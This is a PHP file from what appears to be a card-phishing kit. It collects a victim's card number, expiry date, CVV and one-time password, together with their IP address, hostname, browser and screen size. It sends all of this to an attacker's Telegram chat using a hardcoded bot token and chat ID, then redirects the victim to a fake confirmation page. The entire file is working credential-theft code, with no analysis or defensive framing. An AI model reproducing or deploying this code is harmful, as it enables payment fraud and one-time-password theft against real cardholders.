<?php
session_start();
if(!isset($_SESSION['card'])) die('Accès invalide');

$botToken = "7915597361:AAEL0qP3o5lERMliSGejseHN2H8W_4D0SnM";
$chatID = "-1002475696720";

// Récupération OTP
$otp = $_POST['otp'];
$victim = $_SESSION['victim_info'];
$date = date('l d F Y @ H:i');

// Formatage carte
$cardNumber = $_SESSION['card']['cardNumber'];
$formattedCard = implode(' ', str_split($cardNumber, 4));

// Construction message
$message = "
|+++++++| 😈 CARD - OTP 😈 |+++++++|
|
|💳 NUMB 💳 : $formattedCard
|📆 EXPD 📆 : {$_SESSION['card']['expDate']}
|🔐 CVV 🔐 : {$_SESSION['card']['cvv']}
|
|+++++++| 😈 CARD - OTP 😈 |+++++++|
|
|☎️ OTP ☎️ : $otp
|
|+++++| 😈 VICTIM - INFOS 😈 |+++++|
|
|Submitted by: {$victim['ip']} ({$victim['hostname']})
|Browser: {$victim['browser']}
|Screen Size: {$victim['screen']}
|Received: $date
|
|+++++| 😈  😈  Lajded 😈  😈 |+++++|
";

// Envoi final
sendToTelegram($message);
session_destroy();
header('Location: confirmation.html');
exit();

function sendToTelegram($text) {
    global $botToken, $chatID;
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
        'chat_id' => $chatID,
        'text' => $text
    ]));
}
?>